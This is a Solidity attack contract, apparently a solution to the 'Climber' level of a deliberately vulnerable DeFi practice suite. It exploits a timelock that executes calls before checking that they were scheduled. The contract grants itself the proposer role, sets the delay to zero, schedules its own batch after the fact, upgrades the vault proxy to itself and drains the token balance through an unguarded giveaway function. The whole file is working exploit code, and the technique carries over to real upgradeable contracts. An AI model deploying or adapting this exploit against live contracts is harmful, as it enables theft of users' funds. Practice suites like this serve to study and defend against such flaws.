// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../climber/ClimberTimelock.sol";

contract MaliciousUUPS is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    
    ClimberTimelock timelock;
    address vaultAddress;
    address private attacker; 
    constructor() initializer {
        attacker = msg.sender;
    }

    function giveaway(address tokenAddress, 
                      address recipient) external {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(recipient, token.balanceOf(address(this)));
    }  

    function attack(address tokenAddress,
                    ClimberTimelock _timelock,
                    address _vaultAddress) public {
        timelock = _timelock;
        vaultAddress = _vaultAddress;
        cancelDelayAndScheduleAttack();
        executeAttack();
        MaliciousUUPS(vaultAddress).giveaway(tokenAddress, 
                                             msg.sender);
    }
    
    function cancelDelayAndScheduleAttack() internal {
        // targets are all timelocks
        address[] memory targets = new address[](4);
        targets[0] = address(timelock); 
        targets[1] = address(timelock); 
        targets[2] = address(this); 
        targets[3] = address(this);
        
        // values are all zero
        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        // functioncalls:
        // 1) grantRole(timelock, PROPOSER_ROLE)
        bytes[] memory dataElements = new bytes[](4);
        bytes memory grantRole = abi.encodeWithSignature(
            "grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), 
            address(this)
        );
        dataElements[0] = grantRole;

        // 2) updateDelay(uint64)
        bytes memory cancelDelay = abi.encodeWithSignature(
            "updateDelay(uint64)", 0 days);
         
        dataElements[1] = cancelDelay;
        
        // 3) schedule([timelock],[0], [upgradeTo(..)])
        dataElements[2] = abi.encodeWithSignature("scheduleAttack()");

        // 4) schedule itself to pass the check
        dataElements[3] = abi.encodeWithSignature("scheduleSelf()");
        timelock.execute(targets,
                         values,
                         dataElements,
                         "");
    }
    
    function scheduleSelf() external {
        // targets are all timelocks
        address[] memory targets = new address[](4);
        targets[0] = address(timelock); 
        targets[1] = address(timelock); 
        targets[2] = address(this); 
        targets[3] = address(this);
        
        // values are all zero
        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        // functioncalls:
        // 1) grantRole(timelock, PROPOSER_ROLE)
        bytes[] memory dataElements = new bytes[](4);
        bytes memory grantRole = abi.encodeWithSignature(
            "grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), 
            address(this)
        );
        dataElements[0] = grantRole;

        // 2) updateDelay(uint64)
        bytes memory cancelDelay = abi.encodeWithSignature(
            "updateDelay(uint64)", 0 days);
         
        dataElements[1] = cancelDelay;
        
        // 3) schedule([timelock],[0], [upgradeTo(..)])
        dataElements[2] = abi.encodeWithSignature("scheduleAttack()");

        // 4) schedule itself to pass the check
        dataElements[3] = abi.encodeWithSignature("scheduleSelf()");
        timelock.schedule(targets,
                          values,
                          dataElements,
                          "");
    }

    function scheduleAttack() external {
        // Goal: call upgradeTo(address)
        address[] memory targets = new address[](1);
        targets[0] = vaultAddress;
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory dataElements = new bytes[](1); 
        bytes memory upgradeCall = abi.encodeWithSignature(
            "upgradeTo(address)", address(this)
        );
        dataElements[0] = upgradeCall;
        timelock.schedule(targets,
                          values,
                          dataElements,
                          "");
    }
    
    function executeAttack() internal {
        // Goal: call upgradeTo(address)
        address[] memory targets = new address[](1);
        targets[0] = vaultAddress;
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory dataElements = new bytes[](1); 
        bytes memory upgradeCall = abi.encodeWithSignature(
            "upgradeTo(address)", address(this)
        );
        dataElements[0] = upgradeCall;
        timelock.execute(targets,
                         values,
                         dataElements,
                         "");
    }
    

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}
